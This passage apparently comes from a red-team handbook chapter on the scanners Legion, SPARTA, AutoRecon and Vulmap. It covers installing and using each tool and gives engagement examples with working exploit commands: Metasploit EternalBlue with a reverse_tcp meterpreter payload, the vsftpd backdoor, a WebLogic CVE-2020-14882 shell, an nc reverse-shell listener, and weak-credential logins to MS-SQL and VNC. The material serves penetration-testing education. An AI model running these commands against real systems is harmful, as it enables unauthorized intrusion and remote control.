   - Systems failing SUID binary controls provided privilege escalation paths
   - Missing filesystem restrictions enabled data exfiltration
   - Insufficient audit logging allowed for undetected lateral movement

This example demonstrates how compliance-focused tools like OpenSCAP can be repurposed by red teams to systematically identify and exploit security weaknesses.

## Legion: Automated Network Scanning Framework

Legion is an open-source, semi-automated network penetration testing framework that helps discover and exploit vulnerabilities in network services. It integrates numerous scanning tools into a unified interface.

### Installation

```bash
# Clone the repository
git clone https://github.com/GoVanguard/legion.git
cd legion

# Install dependencies
sudo ./install.sh
```

### Basic Usage

```bash
# Start Legion
sudo legion
```

Legion launches a GUI interface for configuring and running scans.

### Scan Configuration

1. **Create a New Project**: Set up a workspace for your assessment
2. **Add Hosts**: Define target IP addresses or ranges
3. **Configure Scan Options**:
   - Scan profiles (Quick, Comprehensive, etc.)
   - Tool selections (Nmap, Nikto, etc.)
   - Custom tool parameters

### Service Enumeration and Vulnerability Detection

Legion automatically:
1. Identifies live hosts with ping and ARP
2. Performs comprehensive port scanning
3. Fingerprints discovered services
4. Runs vulnerability checks against identified services
5. Organizes findings in a searchable database

### Example: Comprehensive Network Assessment

During a black-box assessment of a manufacturing company, we used Legion to map and analyze their OT/IT network boundary:

1. **Initial Discovery**:
   - Created a dedicated Legion project
   - Configured scan settings for minimal impact on production systems
   - Performed incremental scanning across identified network ranges

2. **Service Enumeration Strategy**:
   - Configured Legion to scan during maintenance windows
   - Used custom Nmap timing templates to reduce impact
   - Focused on industrial protocols (Modbus, Profinet, etc.)

3. **Findings and Exploitation**:
   - Discovered unprotected HMI interfaces with web management
   - Identified PLCs with default credentials
   - Found engineering workstations with vulnerable remote access services

4. **Leveraging Legion's Results**:
   ```bash
   # Export service findings from Legion
   # Target vulnerable VNC services identified by Legion
   vncviewer -passwd /dev/null 192.168.100.25::5900
   
   # Access unprotected HMI interfaces
   firefox http://192.168.100.30:8080/config
   ```

This approach allowed us to demonstrate how an attacker could pivot from the corporate network to critical OT systems through improperly secured boundary systems.

## Sparta/SPARTA: Network Infrastructure Penetration Testing

SPARTA (now known as Legion) is a graphical interface that simplifies network infrastructure penetration testing by automating scanning and organizing results. It's designed for efficiency during professional penetration tests.

### Installation

```bash
# Install on Kali or Parrot OS
apt update && apt install sparta -y
```

### Workflow Automation

SPARTA automates the penetration testing workflow:

1. **Host Discovery**: Identifies live hosts in the target range
2. **Port Scanning**: Conducts comprehensive port scans
3. **Service Identification**: Fingerprints discovered services
4. **Vulnerability Scanning**: Runs targeted vulnerability checks
5. **Brute Force Attacks**: Attempts to crack weak credentials

### Example: From Discovery to Exploitation

In a red team assessment of a logistics company, we used SPARTA to streamline our testing process:

1. **Initial Setup**:
   - Created a new SPARTA project
   - Added the target network range (10.50.0.0/24)
   - Configured scan settings for aggressive enumeration

2. **Automated Discovery Process**:
   - SPARTA identified 45 live hosts
   - Discovered 12 hosts running vulnerable web applications
   - Found 8 hosts with SMB services, including legacy protocols
   - Identified an exposed MS-SQL server

3. **Exploitation Using SPARTA Findings**:

   ```bash
   # Target vulnerable SMB services identified by SPARTA
   # Used EternalBlue exploit against unpatched Windows systems
   msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue;
   set RHOSTS 10.50.0.15;
   set PAYLOAD windows/x64/meterpreter/reverse_tcp;
   set LHOST 10.10.10.5;
   run"
   
   # Access MS-SQL server with weak credentials discovered by SPARTA
   mssqlclient.py sa:Password123@10.50.0.30 -windows-auth
   ```

4. **Lateral Movement Strategy**:
   - Used harvested credentials from the initial compromise
   - Leveraged SPARTA's service map to identify pivot points
   - Established persistence across multiple network segments

This example demonstrates SPARTA's effectiveness as an all-in-one reconnaissance and enumeration tool that accelerates the path from discovery to exploitation.

## AutoRecon: Multi-threaded Reconnaissance Tool

AutoRecon is a multi-threaded reconnaissance tool designed to automate the initial reconnaissance phase of a penetration test. It's particularly popular for CTF-style network enumeration.

### Installation

```bash
# Install from GitHub
git clone https://github.com/Tib3rius/AutoRecon.git
cd AutoRecon
pip3 install -r requirements.txt

# Create a symlink for system-wide access
sudo ln -s $(pwd)/autorecon.py /usr/local/bin/autorecon
```

### Basic Usage

```bash
# Scan a single target
autorecon 10.10.10.10

# Scan multiple targets
autorecon 10.10.10.10 10.10.10.11 10.10.10.12

# Scan a network range
autorecon 10.10.10.0/24
```

### Advanced Configuration

```bash
# Use custom port scan configurations
autorecon 10.10.10.10 --ports 22,80,443,3389,8080

# Specify output directory
autorecon 10.10.10.10 -o /path/to/output

# Run only specific scans
autorecon 10.10.10.10 --only-scans-tftp,smb

# Skip certain scans
autorecon 10.10.10.10 --skip-scans-rdp,vnc
```

### Custom Scan Configuration

Create a custom configuration file for specialized scanning:

```yaml
# custom-config.yaml
port-scan:
  service-detection:
    ports: "1-65535"
    threads: 10
    max-rate: 1000
    timing-template: 4

http:
  web-screenshot:
    threads: 20
    timeout: 30s
  nikto:
    threads: 5
```

Use the custom configuration:

```bash
autorecon 10.10.10.10 --config custom-config.yaml
```

### Scan Output Organization

AutoRecon organizes scan results in a structured directory format:
- `scans/` - Contains all scan outputs
  - `_commands.log` - Log of all commands executed
  - `<ip address>/` - Results for each target
    - `nmap/` - Nmap scan results
    - `<service>/` - Service-specific scan results

### Example: CTF-Style Network Enumeration

During a capture-the-flag competition, we used AutoRecon to quickly identify attack vectors:

1. **Initial Setup**:
   ```bash
   # Create a targets file with all competition IP addresses
   echo "10.10.10.15" > targets.txt
   echo "10.10.10.22" >> targets.txt
   echo "10.10.10.37" >> targets.txt
   
   # Run AutoRecon against all targets
   autorecon -t targets.txt --only-scans-default -v
   ```

2. **Analysis Strategy**:
   - Monitored scan progress in real-time
   - Prioritized targets based on discovered services
   - Focused on services with known vulnerabilities

3. **Quick Exploitation**:
   ```bash
   # Check VSFTPD version from AutoRecon output
   cat scans/10.10.10.15/ftp/vsftpd-version.txt
   
   # Target vulnerable VSFTPD server
   msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor;
   set RHOSTS 10.10.10.15;
   run"
   ```

4. **Information Extraction**:
   - Used harvested service banners to identify exact software versions
   - Leveraged AutoRecon's comprehensive port scanning to find non-standard services
   - Discovered hidden services on high ports that other teams missed

This example demonstrates how AutoRecon's multi-threaded approach enables rapid discovery and exploitation, crucial for time-sensitive environments like CTF competitions.

## Vulmap: Vulnerability Scanner and Exploitation Tool

Vulmap is an open-source vulnerability scanner designed to automate the detection of vulnerabilities in web applications, systems, and networks. It can also facilitate exploitation once vulnerabilities are identified.

### Installation

```bash
# Clone the repository
git clone https://github.com/vulmon/Vulmap.git
cd Vulmap

# Install dependencies
pip3 install -r requirements.txt
```

### Basic Usage

```bash
# Scan a web application
python3 vulmap.py -u http://example.com

# Scan multiple targets
python3 vulmap.py -f targets.txt

# Scan with specific modules
python3 vulmap.py -u http://example.com -m struts2,weblogic,thinkphp
```

### Advanced Scanning Options

```bash
# Set custom HTTP headers
python3 vulmap.py -u http://example.com --headers "User-Agent: Custom" "Cookie: session=1234"

# Set proxy for scanning
python3 vulmap.py -u http://example.com --proxy http://127.0.0.1:8080

# Increase verbosity for debugging
python3 vulmap.py -u http://example.com -v
```

### Exploitation Mode

```bash
# Exploit a vulnerability
python3 vulmap.py -u http://example.com --exploit

# Generate shell payload
python3 vulmap.py -u http://example.com -m struts2 -e s2-057 --shell
```

### Example: Web Application Vulnerability Scanning

During a web application assessment, we used Vulmap to identify and exploit critical vulnerabilities:

1. **Initial Reconnaissance**:
   ```bash
   # Perform initial scan of the web application
   python3 vulmap.py -u https://target-webapp.com -v
   
   # Focus on specific technologies based on initial findings
   python3 vulmap.py -u https://target-webapp.com -m jboss,weblogic,drupal
   ```

2. **Vulnerability Verification**:
   - Analyzed Vulmap's findings to identify true positives
   - Prioritized vulnerabilities with public exploits
   - Verified findings with manual testing

3. **Exploitation**:
   ```bash
   # Exploit WebLogic vulnerability discovered by Vulmap
   python3 vulmap.py -u https://target-webapp.com -m weblogic -e cve-2020-14882 --shell
   
   # Set up listener to receive reverse shell
   nc -lvnp 9001
   ```

4. **Post-Exploitation**:
   - Used initial access to enumerate internal systems
   - Deployed additional scanning tools on the compromised system
   - Established persistence within the target environment

This example shows how Vulmap can streamline the process from vulnerability discovery to exploitation, serving as both a scanning and attack tool.

## Conclusion

Automated vulnerability scanning tools are essential components of a red team's arsenal, providing systematic discovery of security weaknesses across complex environments. While these tools dramatically increase efficiency, their true value comes from the operator's ability to interpret results, prioritize findings, and leverage discovered vulnerabilities for controlled exploitation.

The most effective red team operations combine automated scanning with manual verification and exploitation, using tools like OpenVAS, Nessus, Nexpose, and Lynis to guide their efforts toward the most promising attack vectors. By mastering the tools covered in this chapter, red team operators can efficiently identify security weaknesses and demonstrate their real-world impact through controlled exploitation.

In the next chapter, we'll explore web application vulnerability scanning tools that provide deeper insight into web-specific security issues, complementing the network-focused tools covered here.